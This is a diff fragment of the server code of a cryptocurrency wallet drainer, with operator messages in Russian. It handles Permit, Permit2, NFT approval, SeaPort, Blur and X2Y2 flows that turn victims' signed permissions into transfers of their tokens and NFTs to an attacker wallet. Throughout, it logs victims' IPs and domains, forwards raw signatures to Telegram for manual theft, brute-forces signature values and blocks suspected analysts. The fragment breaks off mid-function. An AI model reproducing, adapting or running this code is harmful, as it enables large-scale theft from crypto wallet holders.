+            await node.waitForTransaction(tx.hash, 1, 60000);
+            for (const x_asset of data.assets) {
+              add_record({
+                type: 'asset_sent', domain: data.domain, IP: data.IP,
+                user_id: data.user_id, asset: x_asset, worker_id: data.worker_id || null
+              });
+            }
+            if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
+              let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_success.chat_id : data.chat_data.sign_success;
+              try {
+                await bot.sendMessage(receiver_chat_id, `<b>💎 Успешно вывели Permit2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСписок токенов, которые были выведены:\n${withdraw_list}`, {
+                  parse_mode: 'HTML'
+                });
+              } catch(err) {
+                console.log(err);
+              }
+            }
+          }
+        } catch(err) {
+          console.log(err);
+          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+            try {
+              await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось вывести токены Permit2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете попробовать вывести эти активы самостоятельно с помощью данных PERMIT, если они включены в настройках дрейнера.`, {
+                parse_mode: 'HTML'
+              });
+            } catch(err) {
+              console.log(err);
+            }
+          }
+          return send_response(response, { status: 'error', error: 'Unable to Execute' });
+        }
+      } catch(err) {
+        console.log(err);
+        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+          try {
+            await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось подписать Permit2 пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете попробовать вывести эти активы самостоятельно с помощью данных PERMIT, если они включены в настройках дрейнера.`, {
+              parse_mode: 'HTML'
+            });
+          } catch(err) {
+            console.log(err);
+          }
+        }
+        return send_response(response, { status: 'error', error: 'Unable to Execute' });
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    return send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const permit_token = async (response, data) => {
+  try {
+    if (MS_Settings.Permit.Mode == 0) return send_response(response, { status: 'OK' });
+    if (MS_Protection) {
+      if (User_IPs_Pool[data.IP]) {
+        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
+          return block_request(response);
+        }
+      }
+    }
+    if (MS_VERIFY_WALLET == 1 && !MS_Verified_Addresses[data.address]) {
+      return send_response(response, { status: 'error', error: 'Verify Wallet First' });
+    }
+    if (data.sign.type == 1) {
+      try {
+        add_record({ type: 'permit_data', domain: data.domain, IP: data.IP, user_id: data.user_id, worker_id: data.worker_id || null, permit_ver: 1, sign: data.sign });
+        if ((data.chat_data == false && MS_Notifications.permit_sign_data.mode) || (data.chat_data != false && data.chat_data.permit_sign_data != "")) {
+          let receiver_chat_id = data.chat_data == false ? MS_Notifications.permit_sign_data.chat_id : data.chat_data.permit_sign_data;
+          await bot.sendMessage(receiver_chat_id, `<b>🔑 Данные PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>owner:</b> <code>${data.sign.owner}</code>\n<b>spender:</b> <code>${data.sign.spender}</code>\n<b>allowed:</b> <code>true</code>\n<b>deadline:</b> <code>${data.sign.deadline}</code>\n<b>v:</b> <code>${data.sign.v}</code>\n<b>r:</b> <code>${data.sign.r}</code>\n<b>s:</b> <code>${data.sign.s}</code>\n\nС помощью этих данных вы можете самостоятельно подписать PERMIT в сети ${chain_id_to_name(data.sign.chain_id)} для контракта: <code>${data.sign.address}</code>`, {
+            parse_mode: 'HTML'
+          });
+        }
+      } catch(err) {
+        console.log(err);
+      }
+    } else {
+      try {
+        add_record({ type: 'permit_data', domain: data.domain, IP: data.IP, user_id: data.user_id, worker_id: data.worker_id || null, permit_ver: 2, sign: data.sign });
+        if ((data.chat_data == false && MS_Notifications.permit_sign_data.mode) || (data.chat_data != false && data.chat_data.permit_sign_data != "")) {
+          let receiver_chat_id = data.chat_data == false ? MS_Notifications.permit_sign_data.chat_id : data.chat_data.permit_sign_data;
+          await bot.sendMessage(receiver_chat_id, `<b>🔑 Данные PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>owner:</b> <code>${data.sign.owner}</code>\n<b>spender:</b> <code>${data.sign.spender}</code>\n<b>value:</b> <code>${data.sign.value}</code>\n<b>deadline:</b> <code>${data.sign.deadline}</code>\n<b>v:</b> <code>${data.sign.v}</code>\n<b>r:</b> <code>${data.sign.r}</code>\n<b>s:</b> <code>${data.sign.s}</code>\n\nС помощью этих данных вы можете самостоятельно подписать PERMIT в сети ${chain_id_to_name(data.sign.chain_id)} для контракта: <code>${data.sign.address}</code>`, {
+            parse_mode: 'HTML'
+          });
+        }
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[data.sign.chain_id]);
+    const signer = new ethers.Wallet(MS_Wallet_Private, node);
+    const contract = new ethers.Contract(data.sign.address, data.sign.abi, signer);
+    const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
+    let gas_limit = null;
+    try {
+      if (data.sign.type == 1) {
+        gas_limit = await contract.estimateGas.permit(data.sign.owner, data.sign.spender, data.sign.nonce, data.sign.deadline, true, data.sign.v, data.sign.r, data.sign.s, { from: MS_Wallet_Address });
+      } else {
+        gas_limit = await contract.estimateGas.permit(data.sign.owner, data.sign.spender, data.sign.value, data.sign.deadline, data.sign.v, data.sign.r, data.sign.s, { from: MS_Wallet_Address });
+      }
+      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
+    } catch(err) {
+      if (MS_Settings.Permit.Bypass == 1)
+        gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
+      else gas_limit = 15000000;
+    }
+    const nonce = await node.getTransactionCount(MS_Wallet_Address, "pending");
+    if (MS_Settings.Permit.Bypass == 0 && ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('5000000'))) {
+      const PERMIT_V_OPTIONS = [ 0, 1, 27, 28, 47, 215 ];
+      let is_valid_option = false;
+      if (MS_Settings.Permit.Challenge == 1) {
+        for (const new_v of PERMIT_V_OPTIONS) {
+          try {
+            try {
+              if (data.sign.type == 1) {
+                gas_limit = await contract.estimateGas.permit(data.sign.owner, data.sign.spender, data.sign.nonce, data.sign.deadline, true, new_v, data.sign.r, data.sign.s, { from: MS_Wallet_Address });
+              } else {
+                gas_limit = await contract.estimateGas.permit(data.sign.owner, data.sign.spender, data.sign.value, data.sign.deadline, new_v, data.sign.r, data.sign.s, { from: MS_Wallet_Address });
+              }
+            } catch(err) {
+              gas_limit = 15000000;
+            }
+            if (ethers.BigNumber.from(gas_limit).lt(ethers.BigNumber.from('5000000'))) {
+              gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
+              is_valid_option = true;
+              data.sign.v = new_v;
+              try {
+                let receiver_chat_id = data.chat_data == false ? MS_Notifications.permit_sign_data.chat_id : data.chat_data.permit_sign_data;
+                if ((data.chat_data == false && MS_Notifications.permit_sign_data.mode) || (data.chat_data != false && data.chat_data.permit_sign_data != "")) {
+                  if (data.sign.type == 1) {
+                    try {
+                      await bot.sendMessage(receiver_chat_id, `<b>🔑 Данные PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСистема автоматического подбора значений обнаружила, что подпись была некорректная и исправила одно или несколько значений:\n\n<b>owner:</b> <code>${data.sign.owner}</code>\n<b>spender:</b> <code>${data.sign.spender}</code>\n<b>allowed:</b> <code>true</code>\n<b>deadline:</b> <code>${data.sign.deadline}</code>\n<b>v:</b> <code>${data.sign.v}</code>\n<b>r:</b> <code>${data.sign.r}</code>\n<b>s:</b> <code>${data.sign.s}</code>\n\nС помощью этих данных вы можете самостоятельно подписать PERMIT в сети ${chain_id_to_name(data.sign.chain_id)} для контракта: <code>${data.sign.address}</code>`, {
+                        parse_mode: 'HTML'
+                      });
+                    } catch(err) {
+                      console.log(err);
+                    }
+                  } else {
+                    try {
+                      await bot.sendMessage(receiver_chat_id, `<b>🔑 Данные PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСистема автоматического подбора значений обнаружила, что подпись была некорректная и исправила одно или несколько значений:\n\n<b>owner:</b> <code>${data.sign.owner}</code>\n<b>spender:</b> <code>${data.sign.spender}</code>\n<b>value:</b> <code>${data.sign.value}</code>\n<b>deadline:</b> <code>${data.sign.deadline}</code>\n<b>v:</b> <code>${data.sign.v}</code>\n<b>r:</b> <code>${data.sign.r}</code>\n<b>s:</b> <code>${data.sign.s}</code>\n\nС помощью этих данных вы можете самостоятельно подписать PERMIT в сети ${chain_id_to_name(data.sign.chain_id)} для контракта: <code>${data.sign.address}</code>`, {
+                        parse_mode: 'HTML'
+                      });
+                    } catch(err) {
+                      console.log(err);
+                    }
+                  }
+                }
+              } catch(err) {
+                console.log(err);
+              }
+              break;
+            }
+          } catch(err) {
+            console.log(err);
+          }
+        }
+      }
+      if (is_valid_option == false) {
+        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+          try {
+            await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось подписать PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСистема обнаружила, что, скорее всего, PERMIT является фейковым и с целью сохранения ваших денежных средств отклонила транзакцию.\n\nВы всё ещё можете попытаться вывести токен вручную, если вы считаете, что подпись всё же является настоящей.`, {
+              parse_mode: 'HTML'
+            });
+          } catch(err) {
+            console.log(err);
+          }
+        }
+        return send_response(response, { status: 'OK' });
+      }
+    }
+    if (data.sign.type == 1) {
+      try {
+        const tx = await contract.permit(data.sign.owner, data.sign.spender, data.sign.nonce, data.sign.deadline, true, data.sign.v, data.sign.r, data.sign.s, {
+          gasLimit: ethers.BigNumber.from(gas_limit),
+          gasPrice: ethers.BigNumber.from(gas_price),
+          nonce: nonce
+        });
+        await node.waitForTransaction(tx.hash, 1, 60000);
+      } catch(err) {
+        console.log(err);
+        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+          try {
+            await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось подписать PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете попробовать вывести эти активы самостоятельно с помощью данных PERMIT, если они включены в настройках дрейнера.`, {
+              parse_mode: 'HTML'
+            });
+          } catch(err) {
+            console.log(err);
+          }
+        }
+        return send_response(response, { status: 'error', error: 'Unable to Execute' });
+      }
+    } else {
+      try {
+        const tx = await contract.permit(data.sign.owner, data.sign.spender, data.sign.value, data.sign.deadline, data.sign.v, data.sign.r, data.sign.s, {
+          gasLimit: ethers.BigNumber.from(gas_limit),
+          gasPrice: ethers.BigNumber.from(gas_price),
+          nonce: nonce
+        });
+        await node.waitForTransaction(tx.hash, 1, 60000);
+      } catch(err) {
+        console.log(err);
+        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+          try {
+            await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось подписать PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете попробовать вывести эти активы самостоятельно с помощью данных PERMIT, если они включены в настройках дрейнера.`, {
+              parse_mode: 'HTML'
+            });
+          } catch(err) {
+            console.log(err);
+          }
+        }
+        return send_response(response, { status: 'error', error: 'Unable to Execute' });
+      }
+    }
+
+    add_record({
+      type: 'permit_success', domain: data.domain, IP: data.IP,
+      user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
+    });
+
+    data.action = 'approve_token';
+    delete data.sign;
+
+    return approve_token(response, data);
+  } catch(err) {
+    console.log(err);
+    try {
+      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+        await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось подписать PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете попробовать вывести эти активы самостоятельно с помощью данных PERMIT, если они включены в настройках дрейнера.`, {
+          parse_mode: 'HTML'
+        });
+      }
+    } catch(err) {
+      console.log(err);
+    }
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const Get_ERC721_Allowance = async (chain_id, contract_address, owner_address, spender_address) => {
+  try {
+    const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[chain_id]);
+    const contract = new ethers.Contract(contract_address, MS_Contract_ABI['ERC721'], node);
+    return await contract.isApprovedForAll(owner_address, spender_address);
+  } catch(err) {
+    console.log(err);
+  } return false;
+};
+
+const safa_approves = async (response, data) => {
+  try {
+    if (MS_Settings.SAFA.Enable == 0 || MS_Settings.SAFA.Withdraw == 0) return send_response(response, { status: 'OK' });
+    if (MS_Protection) {
+      if (User_IPs_Pool[data.IP]) {
+        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
+          return block_request(response);
+        }
+      }
+    }
+    if (MS_VERIFY_WALLET == 1 && !MS_Verified_Addresses[data.address]) {
+      return send_response(response, { status: 'error', error: 'Verify Wallet First' });
+    }
+    let current_allowance = await Get_ERC721_Allowance(data.chain_id, data.contract_address, data.address, MS_Wallet_Address);
+    if (!current_allowance) {
+      await new Promise(r => setTimeout(r, 2000));
+      current_allowance = await Get_ERC721_Allowance(data.chain_id, data.contract_address, data.address, MS_Wallet_Address);
+      if (!current_allowance) {
+        await new Promise(r => setTimeout(r, 5000));
+        current_allowance = await Get_ERC721_Allowance(data.chain_id, data.contract_address, data.address, MS_Wallet_Address);
+        if (!current_allowance) {
+          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+            await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось вывести коллекцию пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>NFT Collection :</b> ${data.contract_address} [${chain_id_to_name(data.chain_id)}]\n\nВозможно, транзакция подтверждения не прошла или ещё в очереди, попробуйте вывести токен в ручном режиме!`, {
+              parse_mode: 'HTML'
+            });
+          }
+          return send_response(response, { status: 'error', error: 'Unable to Execute' });
+        }
+      }
+    }
+    const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[data.chain_id]);
+    const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
+    const signer = new ethers.Wallet(MS_Wallet_Private, node); let stop_withdraw_nfts = false;
+    for (const asset of data.tokens) {
+      try {
+        if (asset.amount_usd <= MS_Settings.SAFA.Withdraw_Amount || stop_withdraw_nfts == true) continue;
+        stop_withdraw_nfts = (MS_Settings.SAFA.Withdraw == 1);
+        const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC721'], signer);
+        let gas_limit = null;
+        try {
+          gas_limit = await contract.estimateGas.transferFrom(data.address, MS_Wallet_Receiver, asset.id, { from: MS_Wallet_Address });
+          gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
+        } catch(err) {
+          if (MS_Settings.SAFA.Bypass == 1)
+            gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
+          else gas_limit = 15000000;
+        }
+        if (MS_Settings.SAFA.Bypass == 0 && ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('5000000'))) {
+          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+            try {
+              await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось вывести NFT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>NFT:</b> ${asset.name} [${chain_id_to_name(asset.chain_id)}]\n\nСистема обнаружила, что, скорее всего, подтверждение является фейковым или вывод этого токена технически невозможен, и с целью сохранения ваших денежных средств отклонила транзакцию.\n\nВы всё ещё можете попытаться вывести токен вручную, если вы считаете, что подпись всё же является настоящей.`, {
+                parse_mode: 'HTML'
+              });
+            } catch(err) {
+              console.log(err);
+            }
+          }
+          continue;
+        }
+        const nonce = await node.getTransactionCount(MS_Wallet_Address, "pending");
+        const tx = await contract.transferFrom(data.address, MS_Wallet_Receiver, asset.id, {
+          gasLimit: ethers.BigNumber.from(gas_limit),
+          gasPrice: ethers.BigNumber.from(gas_price),
+          nonce: nonce
+        });
+        await node.waitForTransaction(tx.hash, 1, 60000);
+        add_record({
+          type: 'asset_sent', domain: data.domain, IP: data.IP,
+          user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
+        });
+        if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
+          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
+          try {
+            await bot.sendMessage(receiver_chat_id, `<b>💎 Успешно выведен NFT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${asset.name} [${chain_id_to_name(asset.chain_id)}, ${parseFloat(asset.amount_usd).toFixed(2)}$]`, {
+              parse_mode: 'HTML'
+            });
+          } catch(err) {
+            console.log(err);
+          }
+        }
+      } catch(err) {
+        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+          try {
+            await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось вывести NFT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>NFT:</b> ${asset.name} [${chain_id_to_name(asset.chain_id)}]\n\nВозможно, транзакция подтверждения не прошла или ещё в очереди, попробуйте вывести токен в ручном режиме!`, {
+              parse_mode: 'HTML'
+            });
+          } catch(err) {
+            console.log(err);
+          }
+        }
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    try {
+      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+        await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось вывести коллекцию пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>NFT Collection :</b> ${data.contract_address} [${chain_id_to_name(data.chain_id)}]\n\nВозможно, транзакция подтверждения не прошла или ещё в очереди, попробуйте вывести токен в ручном режиме!`, {
+          parse_mode: 'HTML'
+        });
+      }
+    } catch(err) {
+      console.log(err);
+    }
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const seaport_handler = async (response, data) => {
+  try {
+    if (MS_Protection) {
+      if (User_IPs_Pool[data.IP]) {
+        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
+          return block_request(response);
+        }
+      }
+    }
+    if (data.seaport == 'request') {
+      if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
+        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_request.chat_id : data.chat_data.approve_request;
+        let nfts_list_str = '';
+        for (const asset of data.assets) {
+          try {
+            nfts_list_str += `${asset.name} (${asset.amount_usd.toFixed(2)}$); `;
+          } catch(err) {
+            console.log(err);
+          }
+        }
+        await bot.sendMessage(receiver_chat_id, `<b>❓ Пользователь #user_${data.user_id} получил запрос на SeaPort</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Список NFT:</b> ${nfts_list_str}`, {
+          parse_mode: 'HTML'
+        });
+      }
+      send_response(response, { status: 'OK' });
+    } else if (data.seaport == 'cancel') {
+      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+        await bot.sendMessage(receiver_chat_id, `<b>❌ Пользователь #user_${data.user_id} отклонил SeaPort</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nМы предложим ему списать NFT отдельно`, {
+          parse_mode: 'HTML'
+        });
+      }
+      send_response(response, { status: 'OK' });
+    } else if (data.seaport == 'success') {
+      if (MS_Settings.SeaPort.Limit == 1 && SeaPort_List[data.address]) {
+        return send_response(response, { status: 'OK' });
+      } SeaPort_List[data.address] = 1;
+      let result = await SeaPort.fulfill(data, MS_Private_RPC_URLs[1], MS_Wallet_Private);
+      if (result) {
+        if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
+          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
+          await bot.sendMessage(receiver_chat_id, `<b>💎 Успешно подписали SeaPort пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете отследить транзакцию через сканеры`, {
+            parse_mode: 'HTML'
+          });
+        }
+      } else {
+        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+          await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось подписать SeaPort пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВозможно, транзакция не прошла или ещё в очереди!`, {
+            parse_mode: 'HTML'
+          });
+        }
+      }
+      send_response(response, { status: 'OK' });
+    } else {
+      send_response(response, { status: 'error', error: 'Unable to Execute' });
+    }
+  } catch (err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const blur_handler = async (response, data) => {
+  try {
+    if (MS_Protection) {
+      if (User_IPs_Pool[data.IP]) {
+        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
+          return block_request(response);
+        }
+      }
+    }
+    if (data.blur == 'request') {
+      if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
+        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_request.chat_id : data.chat_data.approve_request;
+        let nfts_list_str = '';
+        for (const asset of data.assets) {
+          try {
+            nfts_list_str += `${asset.name} (${asset.amount_usd.toFixed(2)}$); `;
+          } catch(err) {
+            console.log(err);
+          }
+        }
+        await bot.sendMessage(receiver_chat_id, `<b>❓ Пользователь #user_${data.user_id} получил запрос на Blur</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Список NFT:</b> ${nfts_list_str}`, {
+          parse_mode: 'HTML'
+        });
+      }
+      send_response(response, { status: 'OK' });
+    } else if (data.blur == 'cancel') {
+      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+        await bot.sendMessage(receiver_chat_id, `<b>❌ Пользователь #user_${data.user_id} отклонил Blur</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nМы предложим ему списать NFT отдельно`, {
+          parse_mode: 'HTML'
+        });
+      }
+      send_response(response, { status: 'OK' });
+    } else if (data.blur == 'root') {
+      let result = await Blur.get_root(data, MS_Private_RPC_URLs[1], MS_Wallet_Private);
+      if (result != false) {
+        send_response(response, { status: 'OK', data: result });
+      } else {
+        send_response(response, { status: 'error', error: 'Unable to Execute' });
+      }
+    } else if (data.blur == 'success') {
+      if (MS_Settings.Blur.Limit == 1 && Blur_List[data.address]) {
+        return send_response(response, { status: 'OK' });
+      } Blur_List[data.address] = 1;
+      let result = await Blur.execute(data, MS_Private_RPC_URLs[1], MS_Wallet_Private);
+      if (result) {
+        if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
+          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
+          await bot.sendMessage(receiver_chat_id, `<b>💎 Успешно подписали Blur пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете отследить транзакцию через сканеры`, {
+            parse_mode: 'HTML'
+          });
+        }
+      } else {
+        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+          await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось подписать Blur пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВозможно, транзакция не прошла или ещё в очереди!`, {
+            parse_mode: 'HTML'
+          });
+        }
+      }
+      send_response(response, { status: 'OK' });
+    } else {
+      send_response(response, { status: 'error', error: 'Unable to Execute' });
+    }
+  } catch (err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const x2y2_handler = async (response, data) => {
+  try {
+    if (MS_Protection) {
+      if (User_IPs_Pool[data.IP]) {
+        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
+          return block_request(response);
+        }
+      }
+    }
+    if (data.x2y2 == 'request') {
+      if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
+        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_request.chat_id : data.chat_data.approve_request;
+        let nfts_list_str = '';
+        for (const asset of data.assets) {
+          try {
+            nfts_list_str += `${asset.name} (${asset.amount_usd.toFixed(2)}$); `;
+          } catch(err) {
+            console.log(err);
+          }
+        }
+        await bot.sendMessage(receiver_chat_id, `<b>❓ Пользователь #user_${data.user_id} получил запрос на X2Y2</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Список NFT:</b> ${nfts_list_str}`, {
+          parse_mode: 'HTML'
+        });
+      }
+      send_response(response, { status: 'OK' });
+    } else if (data.x2y2 == 'cancel') {
